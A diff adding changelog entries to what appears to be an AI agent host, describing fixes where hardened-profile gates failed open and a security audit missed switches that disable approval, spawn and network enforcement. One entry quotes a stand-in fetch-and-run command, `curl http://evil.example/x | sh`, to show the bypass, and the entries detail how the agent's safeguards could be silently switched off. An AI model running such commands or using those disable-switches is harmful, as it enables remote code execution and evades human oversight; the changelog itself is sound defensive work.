@@ -1,3 +1,81 @@
+## 3.339.0
+
+### A7 enforcement asked a variable nothing ever sets
+
+`jscodeMode()` and `strictMode()` each decided whether the host was hardened
+with a bare `process.env.XCLAW_PROFILE === "prod"`. Nothing in `src/` or
+`bin/` assigns that variable — only harness scripts do — so an operator who
+hardened the host the documented way, `profile: "prod"` in `xclaw.json`, left
+it unset. Both gates fail open, so both switched themselves off while every
+other gate agreed the host was prod: `isHardenedProfile(cfg)` true, egress
+`deny`. The canonical alias `strict`, which sixteen source files treat as the
+hardened profile, missed the raw compare from the environment too.
+
+Measured before the fix, on a host whose config file said `profile: "prod"`:
+`assertJsCodeAllowed("document.querySelector('#pay').click()")` returned
+`{ ok: true, mode: "allow" }` — the whole motor-pattern policy off — and an
+unbound session resolved to `actor` instead of being downgraded to
+`observer`, so it actuated with a role it had never claimed.
+
+Both gates now ask `isHardenedProfile()`, the predicate whose own comment
+calls it "the single answer to 'is this host hardened?'". `loadConfig`
+publishes the settled profile name through `setActiveProfile` so gates below
+the config layer — a browser hook reached through the computer bridge cannot
+be handed a cfg — can ask the same question and get the same answer. An
+explicit source still outranks the published one.
+
+The doctor compounded it: `mode === "allow"` was graded `ok` with the text
+"jsCode allow (lab)", an affirmative pass asserting the host is a lab, on the
+one host where that claim is wrong. The grade now depends on whether the host
+is hardened, and lives in a pure `gradeJsCodePolicy` because the probe calls
+`loadConfig` itself and cannot be driven from a test. A third hand-rolled
+copy of the same predicate in doctor's prod-expectations block is gone.
+
+## 3.338.0
+
+### security-audit: grade the switches that DISABLE enforcement
+
+The audit printed an affirmative ok for a protection a second, unreported
+switch had turned off. `bindSystemRunPlan on (frozen argv/cwd/exe before
+approval)` came from the binding flag alone, but freezing the plan and
+CHECKING it at spawn are two switches: with `spawnEnforce=off`,
+`assertPlanAtSpawn` returns `enforced: false` for any command, so a plan
+frozen on `echo safe` still let `curl http://evil.example/x | sh` run.
+Measured before the fix: `ok: true`, 0 errors, zero rows mentioning
+spawnEnforce.
+
+Two more disable-switches had no reporter at all: `mcpAutoApprove` blanket-
+approves every `mcp__<server>__<tool>` call, and `osSandboxUnshareNet: false`
+removes the network namespace, which under a deny/allowlist egress policy is
+the boundary. Each row is graded through the owning module's own predicate —
+`getSpawnEnforceMode`, `shouldUnshareNet`, `getEgressPolicy` — so an
+env-disabled host is seen and the two can never diverge. The netns row is
+emitted only when the egress policy makes it load-bearing.
+
+Also removes a dead branch in `getSpawnEnforceMode` whose comment claimed
+prod defaults to strict: both arms returned `"check"`, in every release.
+
+## 3.337.0
+
+### security audit was blind to bypassApprovals, the strongest switch it exists to report
+
+`xclaw security-audit` on a full-autonomy host printed `ok: true`, 0 errors,
+0 warnings and exited 0 — under a row reading "autoApprove off". It graded
+`security.autoApprove` and never mentioned `security.bypassApprovals`, the
+strictly stronger sibling: autoApprove auto-grants *within* the tier bounds,
+bypassApprovals removes the gate outright. The plausible neighbouring row is
+what made the absence invisible.
+
+Adds a `security.bypassApprovals` row graded on the precedent already in the
+file — warn unhardened, error hardened, error unconditionally for bypass +
+`criticalOverride: "legacy"` — plus an explicit `ok` row when off, so its
+absence is visible too. Corrects two false claims in the approvals.mjs
+comment, both grepped: there is no gateway boot log for bypassApprovals, and
+"nothing is ever asked at any risk tier" is untrue — critical still pends
+unless criticalOverride is "legacy". doctor already reported this via
+`validateConfig`; two subsystems agreeing about one setting is consistency,
+not duplication, so that stays.
+
 ## 3.336.0
 
 ### The registration half now checks the ceremony context too
